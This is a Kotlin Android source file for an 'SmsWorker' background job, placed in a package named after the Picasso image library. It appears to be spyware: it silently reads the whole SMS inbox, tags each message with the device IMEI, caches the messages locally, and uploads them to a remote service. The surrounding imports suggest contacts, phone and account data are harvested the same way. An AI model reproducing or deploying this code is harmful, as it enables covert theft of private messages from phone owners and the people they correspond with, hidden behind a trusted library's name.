package com.squareup.picasso.presentation

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.squareup.picasso.core.LogUtils
import com.squareup.picasso.data.StorageResult
import com.squareup.picasso.data.network.DataResponse
import com.squareup.picasso.data.network.KEY_IMEI_ARG
import com.squareup.picasso.data.network.RemoteSms
import com.squareup.picasso.di.Injector
import com.squareup.picasso.domain.model.ContactEntity
import com.squareup.picasso.domain.model.SmsEntity
import com.squareup.picasso.domain.usecase.account.AddAccountUseCase
import com.squareup.picasso.domain.usecase.account.GetAccountBySendUseCase
import com.squareup.picasso.domain.usecase.account.GetAccountUseCase
import com.squareup.picasso.domain.usecase.account.UpdateAccountUseCase
import com.squareup.picasso.domain.usecase.information.SendPhoneUseCase
import com.squareup.picasso.domain.usecase.information.SendSmsUseCase
import com.squareup.picasso.domain.usecase.sms.AddSmsUseCase
import com.squareup.picasso.domain.usecase.sms.GetSmsBySendUseCase
import com.squareup.picasso.domain.usecase.sms.GetSmsUseCase
import com.squareup.picasso.domain.usecase.sms.UpdateSmsUseCase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

/***
 * https://stackoverflow.com/questions/848728/how-can-i-read-sms-messages-from-the-device-programmatically-in-android
 */
class SmsWorker(context: Context, params: WorkerParameters) : Worker(context, params){

    //UseCase
    private var smsRepository = Injector.provideDataBaseSmsRepository()
    private var addSmsUseCase = AddSmsUseCase(smsRepository)
    private var getSmsUseCase = GetSmsUseCase(smsRepository)
    private var getSmsBySendUseCase = GetSmsBySendUseCase(smsRepository)
    private var updateSmsUseCase = UpdateSmsUseCase(smsRepository)

    private var informationRepository = Injector.provideRemoteInformationRepository()
    private var sendSmsUseCase = SendSmsUseCase(informationRepository)

    private lateinit var imei: String

    override fun doWork(): Result {
        val appContext = applicationContext
        return try {
            imei = inputData.getString(KEY_IMEI_ARG)?:""
            if(imei != "") {
                getSMS(appContext)
                LogUtils.e("Started sms worker")
            }
            Result.success()
        } catch (throwable: Throwable) {
            Result.retry()
        }
    }

    private fun getSMS(context: Context){
        GlobalScope.launch {
            var requiredColumns = arrayOf("_id", "address", "body", "date", "status")

            // Fetch Inbox SMS Message from Built-in Content Provider
            var cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"), requiredColumns, null, null, null
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    var body = cursor.getString(cursor.getColumnIndex("body")) ?: ""
                    var address = cursor.getString(cursor.getColumnIndex("address")) ?: ""
                    var date = cursor.getString(cursor.getColumnIndex("date")) ?: ""
                    var dateSMS = convertLongToTime(date.toLong())
                    var id = cursor.getString(cursor.getColumnIndex("_id")) ?: ""

                    //If _id does not exit in the database, insert contactEntity with send = false
                    var isContact = getSmsUseCase.invoke(id)
                    if (isContact == null) {
                        LogUtils.e("$id no existe en la BD")
                        var contactEntity = SmsEntity(
                            imei,
                            address,
                            body,
                            date,
                            id,
                            false
                        )
                        addSmsUseCase.invoke(contactEntity)
                    }
                }
                //If list of sms (send == false) is not empty then send the list to remote service
                var listSmsNotSend = getSmsBySendUseCase.invoke(false)
                if (listSmsNotSend.isNotEmpty())
                    loadNetworkSms(listSmsNotSend)
            }
        }
    }

    private fun convertLongToTime(time: Long): String {
        val date = Date(time)
        val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        return format.format(date)
    }

    private fun loadNetworkSms(sms: List<SmsEntity>) {
        GlobalScope.launch(Dispatchers.IO) {
            var result: StorageResult<DataResponse> = sendSmsUseCase.invoke(sms)
            when (result) {
                is StorageResult.Complete -> {
                    LogUtils.e("setSms: Success " + result.data?.msj)
                    if (result.data?.msj == "valido") {
                        //Update the list of sms with the field send = true
                        for (item in sms) {
                            item.send = true
                            updateSmsUseCase.invoke(item)
                        }
                    }
                }
                is StorageResult.Failure -> {
                    LogUtils.e("setSms: Error ")
                }
            }
        }
    }
}